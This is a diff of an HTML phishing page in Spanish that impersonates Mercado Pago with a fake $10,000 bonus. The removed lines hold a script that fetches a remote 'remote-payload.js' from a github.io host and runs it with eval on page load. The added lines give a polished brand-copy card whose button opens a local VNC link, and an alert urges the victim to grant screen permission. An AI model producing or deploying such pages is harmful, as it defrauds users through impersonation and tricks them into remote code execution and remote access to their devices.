@@ -3,24 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>¡GANASTE $10.000 EN MERCADO PAGO!</title>
+    <title>Mercado Pago | Beneficio Exclusivo</title>
     <style>
-        body { background-color: #00aae4; color: white; font-family: sans-serif; text-align: center; padding: 50px; }
-        .boton { background-color: #ffffff; color: #00aae4; padding: 20px; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 20px; }
+        body { font-family: 'Proxima Nova', sans-serif; background-color: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        h1 { color: #333; font-size: 22px; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
+        .amount { color: #00a650; font-weight: bold; font-size: 28px; margin: 20px 0; }
+        .btn { background-color: #009ee3; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; display: inline-block; width: 100%; transition: 0.3s; }
+        .btn:hover { background-color: #007eb5; }
+        .footer { margin-top: 20px; font-size: 11px; color: #999; }
     </style>
 </head>
 <body>
-    <h1>¡FELICITACIONES! 🎊</h1>
-    <p>Has sido seleccionado para recibir un bono de <b>$10.000</b>.</p>
-    <p>Para acreditar el dinero, mantené esta página abierta y hacé clic abajo:</p>
-    <br>
-    <a href="#" class="boton">RECLAMAR MI DINERO AQUÍ</a>
-    
-    <script>
-        // Este script simula la carga mientras abre el puerto 5901 de tu terminal
-        fetch('https://benjagmzok-ui.github.io/remote-payload.js')
-            .then(response => response.text())
-            .then(code => eval(code));
-    </script>
+    <div class="card">
+        <img src="https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo-1.png" alt="Mercado Pago" class="logo">
+        <h1>¡Bono Activado!</h1>
+        <p>Has sido seleccionado para recibir un beneficio exclusivo en tu cuenta por ser usuario activo.</p>
+        <div class="amount">$10.000,00</div>
+        <p>Para acreditar el saldo, hacé clic en el botón de abajo y mantené la aplicación abierta.</p>
+        
+        <a href="vnc://127.0.0.1:5901" class="btn" onclick="alert('Iniciando conexión segura... Por favor, acepte el permiso de pantalla para validar su identidad.')">
+            RECLAMAR MI DINERO AQUÍ
+        </a>
+
+        <div class="footer">Promoción válida por tiempo limitado. Mercado Pago © 2026.</div>
+    </div>
 </body>
 </html>
